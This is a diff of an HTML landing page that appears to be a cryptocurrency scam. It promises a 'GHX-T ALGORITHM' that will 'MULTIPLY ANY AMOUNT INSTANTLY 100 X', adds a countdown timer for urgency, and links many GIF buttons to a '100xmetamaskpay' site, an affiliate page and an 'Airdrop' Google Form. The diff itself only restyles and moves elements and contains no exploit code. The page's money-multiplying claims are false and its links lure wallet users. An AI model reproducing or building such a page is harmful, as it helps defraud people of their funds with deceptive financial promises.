@@ -79,16 +79,17 @@
             overflow: visible;
             z-index: 1;
         }
+/* Congratulations GIF Styling */  
+.congratulations-gif {  
+    margin-top: 140px; /* Adds space above the GIF, about 2 inches depending on DPI */  
+    max-width: 400px; /* Limit the width for responsiveness */  
+    display: block; /* Necessary for centering */  
+    margin-left: auto; /* Centers the image */  
+    margin-right: auto; /* Centers the image */  
+    z-index: 2; /* Ensures it appears above other elements */  
+}
 
-        /* Congratulations GIF Styling */  
-        .congratulations-gif {  
-            margin-top: 140px;  
-            max-width: 400px;  
-            display: block;  
-            margin-left: auto;  
-            margin-right: auto;  
-            z-index: 2;  
-        }
+
 
         /* Individual GIFs */
         .gif-container a {
@@ -121,40 +122,39 @@
             pointer-events: none;
             animation: fall linear infinite;
         }
+        
+        /* ➡️ Styling for spaced GIFs under timer */
+.timer-gifs-edge {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    width: 100%;
+    padding: 10px 20px;
+    margin-top: 15px;
+    position: relative;
+    z-index: 3;
+}
+
+.timer-gifs-edge a img {
+    width: 60px;
+    height: auto;
+    transition: transform 0.3s ease;
+    cursor: pointer;
+}
+
+.timer-gifs-edge a img:hover {
+    transform: scale(1.1);
+}
+
+        
 
         @keyframes fall {
             from { transform: translateY(-100%); opacity: 1; }
             to { transform: translateY(100vh); opacity: 0; }
         }
-
-        /*➡️ TOP CORNER GIF PLACEHOLDERS */
-        .top-left, .top-right {
-            position: absolute;
-            top: 140px;
-            width: 80px;
-            z-index: 9999;
-        }
-
-        .top-left {
-            left: 14px;
-        }
-
-        .top-right {
-            right: 14px;
-        }
     </style>
 </head>
 <body>
-
-    <!--➡️ Clickable GIF Placeholder Top Left -->
-    <a href="https://xyz.com" class="top-left">
-        <img src="2x.png" alt="2X" style="width: 100%;">
-    </a>
-
-    <!--➡️ Clickable GIF Placeholder Top Right -->
-    <a href="https://xyz.com" class="top-right">
-        <img src="hiw.gif" alt="HIW" style="width: 100%;">
-    </a>
 
     <!-- Neon Border -->
     <div class="border"></div>
@@ -164,6 +164,17 @@
         <strong>GHX-T ALGORITHM™️©️ MULTIPLY ANY AMOUNT INSTANTLY 100 X LIMITED TIME OFFER</strong><br>
         <span id="timer"></span>
     </div>
+    <!-- ➡️ Start: GIFs under timer aligned left and right -->
+<div class="timer-gifs-edge">
+    <a href="https://xyz.com" class="left-gif">
+        <img src="2x.gif" alt="2X">
+    </a>
+    <a href="https://xyz.com" class="right-gif">
+        <img src="hiw.gif" alt="HIW">
+    </a>
+</div>
+<!-- ➡️ End: GIFs under timer aligned left and right -->
+
 
     <!-- Title GIF -->
     <img src="xx.gif" alt="100X Airdrop" class="title-gif">
@@ -175,18 +186,44 @@
     <div class="gif-container">
         <a href="https://fclmail.github.io/100xmetamaskpay/" class="active"><img src="metamask.gif" alt="MetaMask"></a>
         <a href="https://fclmail.github.io/100xmetamaskpay/"><img src="ghx10000.gif" alt="gMultiplier"></a>
+
+
+
+
+
+
         <a href="https://fclmail.github.io/100xmetamaskpay/"><img src="sale.gif" alt="sMultiplier"></a>
+
         <a href="https://fclmail.github.io/100xmetamaskpay/"><img src="10sec.gif" alt="1Multiplier"></a>
+
+
         <a href="https://fclmail.github.io/100xmetamaskpay/"><img src="ghx10000.gif" alt="gMultiplier"></a>
+
+
         <a href="https://fclmail.github.io/100XAFFILIATENETWORK/"><img src="hpaffiliate.gif" alt="hMultiplier"></a>
+
+
         <a href="https://fclmail.github.io/100xmetamaskpay/"><img src="1min.gif" alt="1Multiplier"></a>
+
         <a href="https://fclmail.github.io/100xmetamaskpay/"><img src="xmax.gif" alt="xMultiplier"></a>
+
         <a href="https://fclmail.github.io/100xmetamaskpay/"><img src="getsome.gif" alt="gMultiplier"></a>
         <a href="https://fclmail.github.io/100xmetamaskpay/"><img src="allthebest.gif" alt="aMultiplier"></a>
         <a href="https://fclmail.github.io/100xmetamaskpay/"><img src="1usd1100x.gif" alt="1Multiplier"></a>
         <a href="https://fclmail.github.io/100xmetamaskpay/"><img src="limitedtimeo.gif" alt="lMultiplier"></a>
         <a href="https://fclmail.github.io/100xmetamaskpay/"><img src="vmcplus.png" alt="vMultiplier"></a>
         <a href="https://fclmail.github.io/100xmetamaskpay/"><img src="ghx10000.gif" alt="gMultiplier"></a>
+
+
+
+
+
+
+
+
+
+
+
         <a href="https://fclmail.github.io/100xmetamaskpay/"><img src="allarewelcome.gif" alt="All Are Welcome"></a>
         <a href="https://fclmail.github.io/100xmetamaskpay/"><img src="clicknow.gif" alt="Click Now"></a>
         <a href="https://fclmail.github.io/100xmetamaskpay/"><img src="supereasy.gif" alt="Super Easy"></a>
@@ -194,33 +231,37 @@
         <a href="https://docs.google.com/forms/d/e/1FAIpQLSdV5AnOMcjMyaoaHnTmeMJgKONrU6rHXs_zyf6cOyFrzpThDg/viewform"><img src="airdrop.gif" alt="Airdrop"></a>
     </div>
 
-    <!-- Congratulations GIF -->  
-    <img src="congratulations.gif" alt="Congratulations!" class="congratulations-gif">  
 
+<!-- Congratulations GIF -->  
+<img src="congratulations.gif" alt="Congratulations!" class="congratulations-gif">  
+    
     <script>
         // Countdown Timer to April 30, 2025
-        function updateTimer() {  
-            const targetDate = new Date("April 30, 2025 00:00:00").getTime();  
-            setInterval(() => {  
-                const now = new Date().getTime();  
-                const timeLeft = targetDate - now;  
 
-                if (timeLeft < 0) {  
-                    document.getElementById("timer").innerHTML = "EXPIRED!";  
-                    return;  
-                }  
+function updateTimer() {  
+    const targetDate = new Date("April 30, 2025 00:00:00").getTime();  
+    setInterval(() => {  
+        const now = new Date().getTime();  
+        const timeLeft = targetDate - now;  
 
-                const days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));  
-                const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));  
-                const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));  
-                const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);  
-                const milliseconds = Math.floor((timeLeft % 1000) / 10);  
+        if (timeLeft < 0) {  
+            document.getElementById("timer").innerHTML = "EXPIRED!";  
+            return;  
+        }  
 
-                document.getElementById("timer").innerHTML =  
-                    `${days}d ${hours}h ${minutes}m ${seconds}s ${milliseconds < 10 ? '0' : ''}${milliseconds}ms`;  
-            }, 100);  
-        }
+        const days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));  
+        const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));  
+        const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));  
+        const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);  
+        const milliseconds = Math.floor((timeLeft % 1000) / 10); // Get milliseconds in two-digit format  
 
+        document.getElementById("timer").innerHTML =  
+            `${days}d ${hours}h ${minutes}m ${seconds}s ${milliseconds < 10 ? '0' : ''}${milliseconds}ms`; // Display milliseconds  
+    }, 100); // Update every 100 milliseconds  
+}
+
+
+        
         updateTimer();
 
         // Scrolling GIFs Logic
@@ -230,9 +271,9 @@
         function showNextGif() {
             gifLinks.forEach(link => link.classList.remove("active"));
             gifLinks[currentGif].classList.add("active");
+
             currentGif = (currentGif + 1) % gifLinks.length;
         }
-
         setInterval(showNextGif, 3000);
 
         // Floating Emojis & Images
@@ -267,5 +308,7 @@
 
 </body>
 </html>
+
+
 
     
